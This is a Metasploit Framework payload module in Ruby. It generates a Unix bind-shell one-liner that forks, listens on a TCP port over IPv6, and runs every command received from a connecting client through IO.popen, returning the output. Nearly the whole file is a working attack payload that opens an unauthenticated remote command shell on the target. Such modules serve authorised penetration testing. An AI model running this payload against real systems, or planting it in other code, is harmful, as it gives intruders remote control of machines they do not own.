##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 142

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
     'Name'        => 'Unix Command Shell, Bind TCP (via Ruby) IPv6',
     'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
     'Author'      => 'kris katterjohn',
     'License'     => MSF_LICENSE,
     'Platform'    => 'unix',
     'Arch'        => ARCH_CMD,
     'Handler'     => Msf::Handler::BindTcp,
     'Session'     => Msf::Sessions::CommandShell,
     'PayloadType' => 'cmd',
     'RequiredCmd' => 'ruby',
     'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
    ))
    register_advanced_options(
      [
        OptString.new('RubyPath', [true, 'The path to the Ruby executable', 'ruby'])
      ]
    )
  end

  def generate(_opts = {})
    vprint_good(command_string)
    return super + command_string
  end

  def command_string
    "#{datastore['RubyPath']} -rsocket -e 'exit if fork;s=TCPServer.new(\"::\",\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
  end
end
